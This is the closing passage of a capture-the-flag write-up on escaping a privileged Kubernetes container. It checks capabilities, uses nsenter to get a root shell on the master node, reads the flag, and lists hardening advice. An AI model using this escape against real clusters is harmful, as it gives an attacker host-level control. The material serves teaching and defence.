Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
Ambient set =
Current IAB:
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

Our bounding set seems to have all the linux capabilities. Let's see what our current bash session has.

```bash
root@royal-fortune:/# grep Cap /proc/$BASHPID/status
CapInh:	0000000000000000
CapPrm:	000001ffffffffff
CapEff:	000001ffffffffff
CapBnd:	000001ffffffffff
CapAmb:	0000000000000000
root@royal-fortune:/#
```

This confirms it. The value `000001ffffffffff` equates to all the linux capabilities and this is currently set for the permitted, effective and bounding set. Based on this we should be able to use `nsenter` to enter into the host pid namespace.

```
root@royal-fortune:/# nsenter -t 1 -i -u -n -m bash
root@master-1:/[0]$
```

Amazing we are on the master node. A quick look into the `/root` directory reveals the final flag.

```bash
root@master-1:/[0]$ ls -la /root/
total 40
drwx------  6 root root 4096 Nov 20 15:08 .
drwxr-xr-x 20 root root 4096 Nov 20 15:06 ..
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  4 root root 4096 Nov 20 15:05 .gnupg
drwxr-xr-x  3 root root 4096 Nov 20 15:06 .kube
-rw-r--r--  1 root root  161 Nov 20 15:07 .profile
drwx------  2 root root 4096 Jan 23  2023 .ssh
-rw-r--r--  1 root root  165 Jan 23  2023 .wget-hsts
-rw-r--r--  1 root root   42 Nov 20 15:08 flag.txt
drwx------  4 root root 4096 Jan 23  2023 snap

root@master-1:/[1]$ cat /root/flag.txt
flag_ctf{TOTAL_MASTERY_OF_THE_SEVEN_SEAS}
```

Congratulations, you have solved Seven Seas.

## Remediation and Security Considerations

This CTF scenario does not have a remediation plan as the purpose is teach Kubernetes and container fundamentals. But important security considerations.

- Where possible do not run privilged containers. If you do need to run privilged containers, ensure you have sufficiently isolated the container onto a seperate node pool to reduce the blast radius.
- Be careful with the permissions you grant service accounts. If a pod is compromised, an adversary can leverage the permissions to perform malicious actions on the cluster. Where possible, use the default account.
- Kubernetes Secrets are base64 encoded and are not secure, be careful with how you use them and who you grant access to secrets
- The Kubernetes network is flat by default and network policies are effective at limiting access to workloads.
- Pod Security Standards restrict the admission of pods that do not meet the requirements. This is a good way to ensure that pods are not running with excessive privileges.
